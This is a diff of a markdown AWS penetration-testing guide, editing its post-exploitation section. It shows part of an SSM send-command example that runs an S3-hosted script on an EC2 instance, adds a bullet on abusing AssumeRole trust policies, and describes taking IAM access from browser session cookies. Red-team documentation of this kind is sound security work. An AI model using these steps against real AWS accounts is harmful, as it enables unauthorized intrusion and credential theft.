@@ -1720,7 +1720,7 @@ Link - https://aws.amazon.com/pt/security/penetration-testing/
       + ...
     
   - STEP 4 - Post-Exploitation
-    + Run Shell Commands on EC2 VMs with 'Send Command'
+    + Run OS commands on EC2 VMs with 'Send Command'
       + After achieving privilege escalation, you may attempt to execute OS‑level commands and access EC2 VM instances along with the data they host.  
       ```
       Example 1
@@ -1750,8 +1750,9 @@ Link - https://aws.amazon.com/pt/security/penetration-testing/
         --instance-id i-06ae9883fe6e5d721 \
         --parameters '{"sourceType":["S3"], "sourceInfo":["{\"path\":\"s3://my-bucket/script.sh\"}"]}'
       ```
-    + Abusing Elastic Container Registry for Lateral Movement
-    + Get IAM Credentials from a Console Session
+    + Abuse insecure AssumeRole trust policies for lateral movement
+    + Abusing Elastic container registry for lateral movement
+    + Get IAM credentials from a console session
       + When performing a penetration test or red team assessment, it is not uncommon to gain access to a developer's machine.
         This presents an opportunity for you to jump into AWS infrastructure via credentials on the system.
         For a myriad of reasons you may not have access to credentials in the .aws folder, but instead have access to their browser's session cookies (for example via cookies.sqlite in FireFox).
